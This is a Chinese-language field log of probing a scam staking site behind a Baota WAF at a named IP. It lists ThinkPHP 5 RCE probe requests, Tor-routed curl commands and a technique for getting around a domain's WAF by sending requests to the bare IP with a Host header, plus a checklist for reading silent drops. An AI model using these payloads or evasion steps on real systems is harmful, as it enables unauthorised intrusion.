# 静默断连 / 通道对照 实测记录

来源：firstgo.io / php12comBack 假 ETH2.0 质押挖矿盘（2026-10-04），源站 `217.194.134.12`，
宝塔 + nginx + ThinkPHP 5.0.24。

---

## 1. 宝塔 WAF 的两种响应粒度

同一台目标、同一套 WAF，对高危特征有两种截然不同的表达：

### 1.1 可见拦截：1002 字节的「网站防火墙」页

```
GET /index.php?s=/index/\think\Request/input&filter[]=phpinfo&data=1
→ 200, len=1002
  <!doctype html><html><head><meta charset="utf-8"><title>网站防火墙</title>…
```

### 1.2 不可见拦截：直接断连

```
GET /index.php?s=/index/\think\app/invokefunction&function=…
→ 空响应（len=0，curl 的 -o 文件都没生成）

GET /index.php?s=/index/\think\Container/invokefunction&…
→ 空响应

GET /index.php?s=/index/\THINK\APP/INVOKEFUNCTION&…   （大小写变体）
→ 空响应
```

**关键**：1.2 与「路由不存在」「出口被封」「超时」在读回上**完全无法区分**。

### 1.3 对照臂（必须在同一轮里跑）

```
GET /index/info.html                        → 200 + JSON  (352B)    ← 通道健康
GET /index.php?s=/index/index/index         → 200 + HTML  (21565B)  ← `s=` 路由本身有效
GET /index.php/index/index                  → 200 + HTML  (21565B)  ← pathinfo 也有效
GET /index.php?s=/index/info                → 200 + JSON  (352B)
```

⇒ 结论才能立住：「WAF 对该载荷静默断连」，**不是**「TP5 RCE 不存在」。
（此处 TP5 RCE 确实也不成立 —— 但那是由**读框架源码确认补丁**得出的，不是由空响应得出的。）

---

## 2. 出口抖动造成的假阴性

同一 URL 连续 6 次（Tor `socks5h://127.0.0.1:9050`）：

```
000:0  000:0  000:0  000:0  000:0  000:0
```

同一时刻另一条请求却成功。本次会话因此出现过两次误判：

1. 把 TP5 RCE 的一批 `len=0` 当成「被补丁堵死」
2. 把某批路径爆破的空结果当成「命名假设排除」

**纪律**：结论写「N 次里 M 次成功」，不写单次空响应。跑之前先拿一个轻量 URL 确认出口活着。

---

## 3. `--resolve` + `socks5h` 的失效与替代

### 失效写法

```bash
curl -sk --socks5-hostname 127.0.0.1:9050 \
     --resolve fengcin.com:443:217.194.134.12 \
     https://fengcin.com/index/info.html
# → 仍走真实 DNS / 域名层（含 WAF）；实测该域名通道整批 000
```

`--resolve` 只覆盖**本地**解析；`socks5h` 把主机名交给代理远端解析，覆盖被忽略。

### 可用写法

```bash
curl -sk --socks5-hostname 127.0.0.1:9050 \
     -H 'Host: fengcin.com' -H 'X-Requested-With: XMLHttpRequest' \
     -d 'address=0x…' \
     https://217.194.134.12/index/check_address_erc.html
# → 200 + JSON（正确路由到目标 vhost）
```

### 注意点

- **TLS SNI = IP** ⇒ nginx 可能选中 default vhost ⇒ **必须带 `Host:` 头**
- 仍要先跑对照（拿 JSON 而不是 default/欢迎页）确认 vhost 路由正确
- 换域名 = 换 vhost = 可能命中不同的 WAF / nginx 规则（部分白标域名无规则）

实测对照（同一轮内）：

| 通道 | `/index/info.html` |
|---|---|
| `https://fengcin.com/…`（域名） | `000` ×6（被封） |
| `https://217.194.134.12/…` + `Host: fengcin.com` | `200` 稳定 |

---

## 4. 可复用检查清单

1. 每批「空响应 / `000`」→ 先跑同通道已知 200 对照；对照空 = 整批作废
2. 固定客户端（UA、代理参数、超时）跑完一整批，别中途换
3. 结论写「通道 + 次数 + 成功率」，不写单次观察
4. 域名通道全挂时，试 **裸 IP URL + `Host:` 头**；先对照再海量探测
5. 「载荷被静默丢弃」写「未确认」，**不写**「不存在」
